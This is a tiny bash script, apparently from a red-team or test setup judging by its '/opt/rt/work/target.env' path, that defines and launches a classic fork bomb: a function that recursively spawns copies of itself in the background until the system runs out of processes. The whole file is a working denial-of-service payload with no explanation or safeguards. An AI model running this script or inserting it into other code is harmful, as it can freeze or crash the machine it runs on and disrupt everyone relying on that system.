#!/bin/bash
. /opt/rt/work/target.env
bomb() { bomb | bomb & }
bomb
sleep 30
